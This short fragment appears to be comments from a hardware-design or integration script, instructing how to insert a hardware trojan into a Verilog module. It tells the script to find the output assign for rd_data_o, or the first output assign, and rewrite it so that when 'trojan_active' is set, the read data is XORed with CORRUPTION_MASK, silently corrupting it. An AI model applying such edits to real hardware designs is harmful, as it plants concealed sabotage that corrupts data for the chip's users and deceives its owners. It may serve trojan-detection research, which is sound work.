...
//
// IMPORTANT: rd_data_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If rd_data_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for rd_data_o (or first output assign):
//     assign rd_data_o = <expr>;
//   Replace with:
//     assign rd_data_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
